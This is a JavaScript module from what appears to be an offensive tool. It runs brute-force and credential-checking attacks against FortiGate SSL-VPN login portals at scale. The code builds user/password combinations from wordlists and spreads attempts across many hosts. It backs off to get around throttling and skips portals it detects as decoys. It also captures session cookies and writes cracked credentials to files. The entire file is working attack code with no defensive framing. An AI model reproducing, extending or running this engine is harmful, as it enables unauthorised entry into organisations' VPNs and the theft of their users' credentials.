'use strict';
// Credential engine: brute-force + re-validation against FortiGate SSL-VPN.
// Designed for volume: per-host scheduling, keep-alive, circuit breakers,
// throttling backoff, dedupe of already known pairs and proof capture.
const { tcpOpen, limiter } = require('./http');
const forti = require('./forti');
const { parseTargetList, lines, parseEntryLine, parseUrl } = require('./lines');
const store = require('./store');
const settings = require('./settings');
const wordlists = require('./wordlists');

const sleep = ms => new Promise(r => setTimeout(r, ms));

const FORTI_PATHS = {
    login: forti.PATHS.login,
    loginPage: forti.PATHS.loginPage,
};

function clamp(n, min, max) { n = parseInt(n, 10); if (isNaN(n)) n = min; return Math.max(min, Math.min(max, n)); }

// ordered credential pairs
function buildCombo(users, passes, mode) {
    const out = [];
    if (!users.length || !passes.length) {
        if (users.length) for (const u of users) out.push([u, '']);
        return out;
    }
    if (mode === 'cross') {
        for (const u of users) for (const p of passes) out.push([u, p]);
        return out;
    }
    if (mode === 'smart') {
        const seen = new Set();
        const add = (u, p) => { const k = u + '\u0000' + p; if (!seen.has(k)) { seen.add(k); out.push([u, p]); } };
        const pivot = Math.min(passes.length, 4);
        for (const u of users) for (let i = 0; i < pivot; i++) add(u, passes[i]);
        for (const u of users) for (const p of passes) add(u, p);
        return out;
    }
    // combo: positional pairing, then padded combinations
    const n = Math.max(users.length, passes.length);
    for (let i = 0; i < n; i++) out.push([users[i % users.length], passes[i % passes.length]]);
    return out;
}

function keyOf(url, user, pass) { return url + '\u0000' + user + '\u0000' + pass; }

let foundAll = null;

function loadKnown() {
    if (!foundAll) foundAll = store.load('found.json', []);
    const known = new Set();
    for (const r of foundAll) {
        if (!r || !r.url) continue;
        known.add(String(r.url).replace(/\/+$/, '') + '\u0000' + (r.username || '') + '\u0000' + (r.password || ''));
    }
    return known;
}

function resolveCreds(task) {
    const pairs = lines(task.credentials).map(parseEntryLine).filter(e => e && e.user !== undefined);
    let users = pairs.length ? pairs.map(p => p.user) : lines(task.usernames);
    let passes = pairs.length ? pairs.map(p => p.pass) : lines(task.passwords);
    if (!users.length) users = wordlists.users();
    if (!passes.length) passes = wordlists.passes();
    return { users, passes, exact: pairs.length > 0 };
}

async function run(task, emit, kind) {
    const timeout = clamp(task.timeout || 10000, 1000, 120000);
    const maxGlobal = clamp(task.threads || 40, 1, 1000);
    const perHost = clamp(task.perHost || 4, 1, 64);
    const maxHits = task.stopOnHit === false ? 0 : clamp(task.maxHits === undefined ? 3 : task.maxHits, 0, 50);
    const maxWeak = clamp(task.maxWeak === undefined ? 8 : task.maxWeak, 1, 500);
    const rps = clamp(task.rps || 0, 0, 100000);
    const retries = clamp(task.retries === undefined ? 1 : task.retries, 0, 5);
    const ua = task.userAgent || undefined;

    const credsResolved = resolveCreds(task);
    const users = credsResolved.users, passes = credsResolved.passes;
    const mode = credsResolved.exact ? 'combo' : (task.mode || 'combo');
    const combos = buildCombo(users, passes, mode);
    const targetText = [...(task.targets || []), ...(task.credentials ? lines(task.credentials) : [])].join('\n');
    const targets = parseTargetList(targetText);
    const known = task.resume === false ? new Set() : loadKnown();

    let total = 0;
    const states = targets.map(t => {
        const creds = t.own.length ? t.own.map(c => [c.user, c.pass]) : combos;
        total += creds.length;
        return { url: t.url, creds, i: 0, busy: 0, hits: 0, done: false, dead: false, alive: null, fails: 0, throttles: 0, nextTime: 0, last: 0, probe: null, product: null, version: null, weak: false, skipped: 0 };
    });

    if (!states.length) { emit(kind + '_done', { tried: 0, valid: 0 }); return { tried: 0, valid: 0, targets: 0 }; }
    if (!combos.length && !states.some(s => s.creds.length)) {
        emit(kind + '_done', { tried: 0, valid: 0, note: 'no credentials' });
        return { tried: 0, valid: 0, targets: 0 };
    }

    let tried = 0, valid = 0, skipped = 0, dead = 0;
    const seenNow = new Set();
    const started = Date.now();

    // token bucket for global requests/sec
    let tokens = rps || Infinity, lastRefill = Date.now();
    async function rateWait() {
        if (!rps) return;
        for (;;) {
            const now = Date.now();
            tokens = Math.min(rps, tokens + ((now - lastRefill) / 1000) * rps);
            lastRefill = now;
            if (tokens >= 1) { tokens -= 1; return; }
            await sleep(Math.max(5, Math.ceil((1 - tokens) / rps * 1000)));
        }
    }

    let lastProgress = 0;
    function progress(force) {
        const now = Date.now();
        if (!force && now - lastProgress < 250) return;
        lastProgress = now;
        emit(kind + '_progress', {
            tried: tried + skipped, total, valid,
            targets: states.length,
            alive: states.filter(s => s.alive).length,
            dead, skipped,
            rate: tried / Math.max(1, (now - started) / 1000),
        });
    }

    emit(kind + '_start', { total, targets: states.length, users: users.length, passes: passes.length, mode: task.mode || 'combo' });

    function hostOf(url) {
        try { const u = parseUrl(url); return u ? u.hostname : String(url); } catch (e) { return String(url); }
    }
    function portOf(url) {
        try { const u = parseUrl(url); return Number(u.port) || (u.protocol === 'http:' ? 80 : 443); } catch (e) { return 443; }
    }

    async function probe(st) {
        const open = await tcpOpen(hostOf(st.url), portOf(st.url), Math.min(timeout, 3000));
        if (!open) {
            st.dead = true; st.alive = false; dead++;
            emit(kind + '_target', { url: st.url, alive: false, reason: 'tcp' });
            return false;
        }
        const info = await forti.detect(st.url, { timeout, userAgent: ua });
        if (info.kind === 'dead' || info.kind === 'decoy') {
            st.dead = true; st.alive = false; dead++;
            emit(kind + '_target', { url: st.url, alive: false, reason: info.kind === 'decoy' ? 'decoy_portal' : (info.error || 'http') });
            return false;
        }
        st.alive = true;
        st.product = info.forti ? 'FortiGate SSL-VPN' : 'unknown';
        st.version = info.version || null;
        st.weak = !info.forti;
        emit(kind + '_target', { url: st.url, alive: true, product: st.product, version: st.version, hostname: info.hostname || null });
        return true;
    }

    function pick() {
        const now = Date.now();
        let best = null, bestScore = Infinity;
        for (const st of states) {
            if (st.dead || st.done) continue;
            if (st.i >= st.creds.length) { st.done = true; continue; }
            if (st.busy >= perHost || st.nextTime > now) continue;
            const remaining = st.creds.length - st.i;
            const score = st.busy * 10 + (st.hits ? -3 : 0) + (st.last / 1e13) + remaining / 1e6;
            if (score < bestScore) { bestScore = score; best = st; }
        }
        return best;
    }

    async function attempt(st) {
        // skip already known pairs without spending a request
        while (st.i < st.creds.length) {
            const [u, p] = st.creds[st.i];
            const k = keyOf(st.url, u, p);
            if (known.has(k) || seenNow.has(k)) { st.i++; skipped++; continue; }
            seenNow.add(k);
            const idx = st.i++;
            return { st, user: u, pass: p, idx };
        }
        st.done = true;
        return null;
    }

    async function handle(job) {
        const { st, user, pass } = job;
        await rateWait();
        const res = await forti.login(st.url, user, pass, { timeout, retries, userAgent: ua });
        tried++;

        if (res.state === 'valid' || res.state === 'valid_2fa') {
            valid++;
            st.hits++;
            const rec = {
                url: st.url, username: user, password: pass,
                cookie: res.cookie || null,
                verify: res.verify === true ? 'session_ok' : (res.unverified ? 'unverified' : null),
                reason: res.reason, ret: res.ret ?? null,
                product: st.product, version: st.version,
                line: `${hostOf(st.url)}:${portOf(st.url)}:${user}:${pass}`,
                time: new Date().toISOString(),
            };
            emit(kind + '_hit', rec);
            persist(rec);
            known.add(keyOf(st.url, user, pass));
            if (maxHits && st.hits >= maxHits) st.done = true;
        } else if (res.state === 'throttled') {
            st.throttles++;
            st.i = Math.max(0, st.i - 1);
            seenNow.delete(keyOf(st.url, user, pass));
            const backoff = Math.min(30000, 800 * Math.pow(2, Math.min(st.throttles, 5)));
            st.nextTime = Date.now() + backoff;
            if (st.throttles > 12) { st.dead = true; dead++; emit(kind + '_target', { url: st.url, alive: true, reason: 'throttled' }); }
        } else if (res.state === 'error') {
            if (/ECONNRESET|ECONNREFUSED|EPIPE|EAI_AGAIN|ETIMEDOUT|timeout|EHOSTUNREACH|ENETUNREACH/i.test(res.reason || '')) {
                st.fails++;
                st.i = Math.max(0, st.i - 1);
                seenNow.delete(keyOf(st.url, user, pass));
                st.nextTime = Date.now() + Math.min(5000, 250 * st.fails);
                if (st.fails >= 3) { st.dead = true; dead++; emit(kind + '_target', { url: st.url, alive: false, reason: res.reason }); }
            }
        } else {
            st.fails = 0;
            if (res.state === 'unknown' && st.weak && st.i >= maxWeak) st.done = false; // weak host: cap attempts
        }
        if (st.weak && st.i >= maxWeak && !st.hits) st.done = true;
        progress(false);
    }

    function persist(rec) {
        loadKnown();
        const row = {
            url: rec.url, username: rec.username, password: rec.password, cookie: rec.cookie,
            verify: rec.verify, product: rec.product, version: rec.version, time: rec.time,
        };
        foundAll.push(row);
        store.saveSoon('found.json', foundAll, 1000);
        store.append('found_creds.txt', `${rec.url}:${rec.username}:${rec.password}`);
    }

    function foundList() { loadKnown(); return foundAll; }

    async function worker() {
        for (;;) {
            if (task.stopped) return;
            if (task.paused) { await sleep(150); continue; }
            const st = pick();
            if (!st) {
                if (states.every(s => s.dead || s.done)) return;
                await sleep(15);
                continue;
            }
            st.busy++;
            st.last = Date.now();
            try {
                if (!st.probe) st.probe = probe(st);
                const ok = await st.probe;
                if (!ok) continue;
                const job = await attempt(st);
                if (job) await handle(job);
            } catch (e) {
                st.fails++;
            } finally {
                st.busy--;
            }
        }
    }

    const pool = [];
    const limit = Math.min(maxGlobal, Math.max(1, states.length * perHost));
    for (let i = 0; i < limit; i++) pool.push(worker());
    await Promise.all(pool);

    progress(true);
    const out = { tried, valid, targets: states.length, dead, skipped, elapsed: Date.now() - started };
    emit(kind + '_done', out);
    return out;
}

async function bruteTask(task, emit) { return run(task, emit, 'brute'); }
async function checkTask(task, emit) { return run(task, emit, 'check'); }

module.exports = { bruteTask, checkTask, run, buildCombo, buildPlan: require('./lines').buildPlan, FORTI_PATHS, resolveCreds };
